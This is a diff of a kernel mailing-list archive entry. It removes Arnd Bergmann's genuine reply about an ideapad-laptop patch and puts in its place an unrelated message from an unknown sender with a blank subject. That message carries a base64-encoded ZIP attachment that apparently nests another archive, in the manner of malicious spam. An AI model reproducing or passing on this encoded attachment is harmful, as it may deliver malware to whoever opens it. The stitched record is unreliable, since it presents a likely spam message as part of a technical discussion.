@@ -1,50 +1,75 @@
-From: Arnd Bergmann <arnd@arndb.de>
-Subject: Re: [PATCH] platform/x86: ideapad-laptop: hide unused 'touchpad_store'
-Date: Mon, 22 May 2017 22:36:52 +0200
-Message-ID: <CAK8P3a0iSm682vPuva6mTk479xx92Ho2uyV07J4_iN_THEsGZA@mail.gmail.com>
-References: <20170522130709.242445-1-arnd@arndb.de> <CAHp75Ve5cN4bkA1Q2-6_N6wz0ZCsps3fOnb1Kobi_wK5=Hn4Jg@mail.gmail.com>
+From: <horizon@qubeglobal.com>
+Subject: (unknown)
+Date: Mon, 22 May 2017 20:39:59 -0000
+Message-ID: <149548559965.6150.3243996797135936940@udm.net>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="UTF-8"
-Return-path: <linux-kernel-owner@vger.kernel.org>
-In-Reply-To: <CAHp75Ve5cN4bkA1Q2-6_N6wz0ZCsps3fOnb1Kobi_wK5=Hn4Jg@mail.gmail.com>
-Sender: linux-kernel-owner@vger.kernel.org
-To: Andy Shevchenko <andy.shevchenko@gmail.com>
-Cc: Ike Panhc <ike.pan@canonical.com>, Darren Hart <dvhart@infradead.org>, Andy Shevchenko <andy@infradead.org>, =?UTF-8?B?TWljaGHFgiBLxJlwaWXFhA==?= <kernel@kempniu.pl>, Brian Masney <masneyb@onstation.org>, Ritesh Raj Sarraf <rrs@debian.org>, Mika Westerberg <mika.westerberg@linux.intel.com>, Platform Driver <platform-driver-x86@vger.kernel.org>, "linux-kernel@vger.kernel.org" <linux-kernel@vger.kernel.org>
-List-Id: platform-driver-x86.vger.kernel.org
+Content-Type: application/zip; name="66593863594.zip"
+Content-Transfer-Encoding: base64
+Return-path: <platform-driver-x86-owner@vger.kernel.org>
+Received: from a241.sub87.net78.udm.net ([78.85.87.241]:41749 "HELO udm.net"
+        rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with SMTP
+        id S932886AbdEVUkE (ORCPT
+        <rfc822;platform-driver-x86@vger.kernel.org>);
+        Mon, 22 May 2017 16:40:04 -0400
+Subject: 
+Content-Disposition: attachment
+Sender: platform-driver-x86-owner@vger.kernel.org
+List-ID: <platform-driver-x86.vger.kernel.org>
+To: platform-driver-x86@vger.kernel.org
 
-On Mon, May 22, 2017 at 7:02 PM, Andy Shevchenko
-<andy.shevchenko@gmail.com> wrote:
-> On Mon, May 22, 2017 at 4:07 PM, Arnd Bergmann <arnd@arndb.de> wrote:
->> A readonly sysfs property must not have a 'store' function:
->>
->> drivers/platform/x86/ideapad-laptop.c:438:16: error: 'touchpad_store' defined but not used [-Werror=unused-function]
->>
->> We can either comment it out or remove the function entirely,
->> without a good reason one or or another I picked the second option.
->
-> Hmm... I was expecting something like this but didn't get a single
-> error from kbuild bot.
->
->>
->> Fixes: 7f363145992c ("platform/x86: ideapad-laptop: Switch touchpad attribute to be RO")
->> Signed-off-by: Arnd Bergmann <arnd@arndb.de>
->> ---
->>  drivers/platform/x86/ideapad-laptop.c | 4 +++-
->>  1 file changed, 3 insertions(+), 1 deletion(-)
->>
->> diff --git a/drivers/platform/x86/ideapad-laptop.c b/drivers/platform/x86/ideapad-laptop.c
->> index f7a4608cc60b..c4c7ae3179c0 100644
->> --- a/drivers/platform/x86/ideapad-laptop.c
->> +++ b/drivers/platform/x86/ideapad-laptop.c
->> @@ -435,6 +435,8 @@ static ssize_t touchpad_show(struct device *dev,
->>         return sprintf(buf, "%lu\n", result);
->>  }
->>
->> +#if 0
->> +/* Switch to RO for now: It might be revisited in the future */
->
-> Can we use __maybe_unused instead?
-
-Sure, whichever you prefer. I guess you'll just commit that patch yourself then?
-
-      Arnd
+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
+SwUGAAAAAAEAAQBPAAAA7wsAAAAA
